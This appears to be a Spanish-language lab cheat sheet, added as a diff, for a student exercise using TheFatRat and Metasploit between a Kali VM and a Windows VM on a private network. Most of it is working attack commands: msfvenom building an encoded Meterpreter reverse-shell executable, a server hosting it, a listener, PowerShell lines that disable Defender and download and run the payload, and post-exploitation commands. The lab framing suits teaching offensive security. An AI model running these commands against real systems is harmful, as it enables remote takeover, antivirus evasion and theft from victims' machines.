@@ -1,0 +1,101 @@
+=====================================================================
+  CHEATSHEET RAPIDO - Kali Itmar <-> Windows Bokul
+  Kali:  192.168.163.129
+  Win:   192.168.163.130
+=====================================================================
+
+
+┌─────────────────────────────────────────────────────────────────────┐
+│  🐧 EN KALI ITMAR (1 solo comando - TODO AUTOMATICO)              │
+└─────────────────────────────────────────────────────────────────────┘
+
+PASO 1: Copia el script a Kali
+  Desde Windows (PowerShell Admin):
+    Copy-Item "C:\Users\Usuario\Documents\1 Semestre 2026\fatrat-lab\ataque-total-kali.sh" "\\192.168.163.129\tmp\"
+
+  O descarga directo en Kali:
+    wget -O /tmp/ataque-total-kali.sh https://...  # o pasalo por USB
+
+PASO 2: Ejecuta en Kali Itmar
+  chmod +x /tmp/ataque-total-kali.sh
+  sudo /tmp/ataque-total-kali.sh
+
+  El script:
+  ✅ Verifica conexion con Windows Bokul
+  ✅ Instala TheFatRat + dependencias (si no las tiene)
+  ✅ Genera payload.exe apuntando a 192.168.163.130:4444
+  ✅ Inicia servidor HTTP en puerto 8000
+  ✅ Crea archivo RC para Metasploit
+  ✅ Te avisa cuando esta todo listo
+
+PASO 3: ABRE UNA SEGUNDA TERMINAL en Kali
+  msfconsole -q -r /tmp/listener-fatrat.rc
+
+
+┌─────────────────────────────────────────────────────────────────────┐
+│  🪟 EN WINDOWS BOKUL (PowerShell ADMIN)                           │
+└─────────────────────────────────────────────────────────────────────┘
+
+PASO 4: Ejecuta el script automatico
+  Copia desde carpeta compartida o descarga:
+  C:\Users\Usuario\Documents\1 Semestre 2026\fatrat-lab\ataque-windows-bokul.ps1
+
+  O manualmente, estos 4 comandos:
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    mkdir C:\payloads -Force
+    Invoke-WebRequest -Uri "http://192.168.163.129:8000/payload.exe" -OutFile "C:\payloads\payload.exe"
+    C:\payloads\payload.exe
+
+
+┌─────────────────────────────────────────────────────────────────────┐
+│  📸 CAPTURAS POR MAQUINA                                           │
+└─────────────────────────────────────────────────────────────────────┘
+
+EN KALI ITMAR (13 capturas):
+
+  1  ping 192.168.163.130            → Ver conexion
+  2  ip a                            → IP de Kali
+  3  Instalando paquetes             → Proceso de instalacion
+  4  Clonando TheFatRat              → git clone
+  5  Instalando gems Ruby            → gem install
+  6  chk_tools                       → Verificacion herramientas
+  7  msfvenom generando payload      → Creacion del .exe
+  8  ls -lh payload.exe              → Payload generado
+  9  Servidor HTTP corriendo         → python3 -m http.server
+  10 Listener Metasploit             → msfconsole corriendo
+  11 sysinfo de Windows Bokul        → Info del sistema victima
+  12 getuid / screenshot             → Usuario + captura escritorio
+  13 Resumen final                   → Todo completado
+
+EN WINDOWS BOKUL (9 capturas):
+
+  1  ipconfig                        → IP: 192.168.163.130
+  2  ping 192.168.163.129            → Conexion con Kali
+  3  Get-MpPreference                → Defender ANTES de desactivar
+  4  Get-NetFirewallRule             → Reglas de firewall
+  5  Invoke-WebRequest descargando   → Descargando payload.exe
+  6  Get-ChildItem payload.exe       → Payload en disco
+  7  Ejecutando payload              → Start-Process
+  8  netstat | findstr 4444          → Conexion activa con Kali
+  9  Get-Process payload             → Proceso corriendo
+
+
+┌─────────────────────────────────────────────────────────────────────┐
+│  🔥 COMANDOS ULTRA-RAPIDOS (lo minimo necesario)                  │
+└─────────────────────────────────────────────────────────────────────┘
+
+--- KALI ITMAR (si ya tienes todo instalado) ---
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.163.129 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o ~/payload.exe
+python3 -m http.server 8000 &
+msfconsole -q -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit -j -z"
+
+--- WINDOWS BOKUL (PowerShell Admin) ---
+Set-MpPreference -DisableRealtimeMonitoring $true
+Invoke-WebRequest -Uri "http://192.168.163.129:8000/payload.exe" -OutFile "C:\payload.exe"
+C:\payload.exe
+
+--- UNA VEZ EN METERPRETER ---
+sysinfo
+getuid
+screenshot
+shell
